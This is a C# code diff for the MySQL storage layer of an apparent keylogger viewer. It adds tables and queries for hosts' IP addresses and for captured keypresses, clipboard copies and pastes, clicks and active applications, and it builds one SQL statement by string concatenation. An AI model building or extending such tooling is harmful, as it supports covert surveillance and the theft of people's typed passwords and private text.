@@ -17,20 +17,96 @@ namespace keyloggerviewer
         private static DbLink link=null;
 
         
-        public static DbLink  getInstance(string server, string user, string password, string dbName, string port)
+        public static DbLink  getInstance(string server, string user, string password, string port, string dbName = "")
         {
             // permet de récupérer une connexion sql ou de la créer si ce n'est pas encore le cas.
-            if (link != null)
+            if (link == null)
             {
-                link = new DbLink(server, user, password, dbName, port);
+                link = new DbLink(server, user, password, port, dbName);
             }
 
             return link;
         }
         
-        private DbLink(string server, string user, string password, string dbName, string port)
+        public static DbLink  createInstance(string server, string user, string password, string port, string dbName)
         {
-            string connStr = "server=" + server + ";user=" + user + ";database=" + dbName + ";port=" + port + ";password=" + password;
+            // permet de créer une connexion sql en initialisant la base de donnée
+            if (link == null)
+            {
+                link = new DbLink(server, user, password, port);
+                if (link.createDb(dbName))
+                {
+                    link = null;
+                    link = new DbLink(server, user, password, port, dbName);
+                    link.createTable();
+                }
+                else
+                {
+                    link = null;
+                }
+                
+            }
+
+            return link;
+        }
+
+        public void createTable()
+        {
+            string s0 = @"CREATE TABLE `host` (
+                `hostId` int(11) NOT NULL,
+                `hostName` varchar(50) NOT NULL,
+                `hostPrivateIp` varchar(15) DEFAULT NULL,
+                `hostPublicIp` varchar(15) DEFAULT NULL
+                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;CREATE TABLE `log` (
+  `hostId` int(20) NOT NULL,
+  `logId` int(11) NOT NULL,
+  `logType` set('text','copy','paste','click','shortcut','keypress') NOT NULL,
+  `logDate` date NOT NULL DEFAULT current_timestamp(),
+  `content` text DEFAULT NULL,
+  `logTime` time DEFAULT NULL,
+  `application` varchar(100) DEFAULT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;ALTER TABLE `host`
+  ADD PRIMARY KEY (`hostId`);ALTER TABLE `log`
+  ADD PRIMARY KEY (`logId`,`hostId`),
+  ADD KEY `host` (`hostId`);ALTER TABLE `host`
+  MODIFY `hostId` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;ALTER TABLE `log`
+  ADD CONSTRAINT `host` FOREIGN KEY (`hostId`) REFERENCES `host` (`hostId`);
+COMMIT;";
+            connection.Open();
+            MySqlCommand cmd = new MySqlCommand(s0, connection);
+            cmd.ExecuteNonQuery();
+        }
+
+
+        public bool createDb(string dbName)
+        {
+            string s0 = "CREATE DATABASE `" + dbName + "`;";
+            connection.Open();
+            MySqlCommand cmd = new MySqlCommand(s0, connection);
+            bool result = true;
+            try
+            {
+                cmd.ExecuteNonQuery();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+                result = false;
+            }
+
+            connection.Close();
+            return result;
+        }
+        
+        private DbLink(string server, string user, string password, string port, string dbName="")
+        {
+            string connStr;
+            if (dbName != "")
+                connStr = "server=" + server + ";user=" + user + ";database=" + dbName + ";port=" + port + ";password=" + password;
+            else
+            {
+                connStr = "server=" + server + ";user=" + user + ";port=" + port + ";password=" + password;
+            }
             this.connection = new MySqlConnection(connStr);
             this.connection.Open();
             this.connection.Close();
@@ -85,7 +161,7 @@ namespace keyloggerviewer
             foreach (int[] i in idCombo)
             {
                 sqlReq =
-                    @"SELECT h.hostName, h.hostPublicIp, h.hostPrivateIp, TIMESTAMP(l.logDate, l.logTime), l.logType, l.content, l.logId
+                    @"SELECT h.hostName, l.application, h.hostPrivateIp, TIMESTAMP(l.logDate, l.logTime), l.logType, l.content, l.logId
                             FROM host as h JOIN log as l ON h.hostId = l.hostId
                             WHERE (l.logId <= @maxLog) AND (l.logId >= @minLog) AND (l.hostId=@hostId)";
                 req = new MySqlCommand(sqlReq, connection);
@@ -271,7 +347,7 @@ namespace keyloggerviewer
             }
 
             string sqlReq =
-                "INSERT INTO log (hostId, logId, logType, logDate, logTime, content) VALUES (@hostId, @logId, @logType, @logDate, @logTime, @content)";
+                "INSERT INTO log (hostId, logId, logType, logDate, logTime, content, application) VALUES (@hostId, @logId, @logType, @logDate, @logTime, @content, @application)";
             MySqlCommand req = new MySqlCommand(sqlReq, connection);
             req.Parameters.Add("@hostId", MySqlDbType.Int32);
             req.Parameters.Add("@logId", MySqlDbType.Int32);
@@ -279,6 +355,7 @@ namespace keyloggerviewer
             req.Parameters.Add("@logDate", MySqlDbType.DateTime);
             req.Parameters.Add("@logTime", MySqlDbType.DateTime);
             req.Parameters.Add("@content", MySqlDbType.String);
+            req.Parameters.Add("@application", MySqlDbType.String);
             foreach (Log log in h.LogList)
             {
                 req.Parameters["@hostId"].Value = log.HostId;
@@ -287,6 +364,7 @@ namespace keyloggerviewer
                 req.Parameters["@logDate"].Value = log.LogDate;
                 req.Parameters["@logTime"].Value = log.LogTime;
                 req.Parameters["@content"].Value = log.LogContent;
+                req.Parameters["@application"].Value = log.LogApp;
                 req.ExecuteNonQuery();
             }
             
